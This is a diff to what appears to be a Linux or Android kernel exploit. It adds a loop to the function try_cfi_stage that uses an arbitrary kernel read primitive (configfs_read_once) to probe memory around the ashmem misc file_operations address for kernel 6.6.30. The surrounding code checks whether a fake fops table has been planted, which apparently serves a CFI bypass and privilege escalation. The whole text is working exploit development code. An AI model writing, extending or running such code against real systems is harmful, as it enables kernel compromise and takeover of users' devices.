@@ -259,6 +259,17 @@ int try_cfi_stage(void) {
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
+
+  /* Probe around expected offset to find correct ASHMEM_MISC_FOPS for kernel 6.6.30 */
+  pr_info("cfi probe start misc_fops=%016zx pre_rb=%zd pre_fops=%016llx want=%016zx\n",
+          misc_fops, pre_rb, (unsigned long long)pre_fops, fake_fops);
+  for (int i = -4; i <= 4; i++) {
+    uintptr_t probe = misc_fops + i * 8;
+    uint64_t probe_val = 0;
+    ssize_t probe_rb = configfs_read_once(fd, probe, &probe_val, sizeof(probe_val));
+    pr_info("cfi probe[%d] addr=%016zx rb=%zd val=%016llx\n",
+            i, probe, probe_rb, (unsigned long long)probe_val);
+  }
   if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
     pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
                "read=%016llx want=%016zx errno=%d\n",
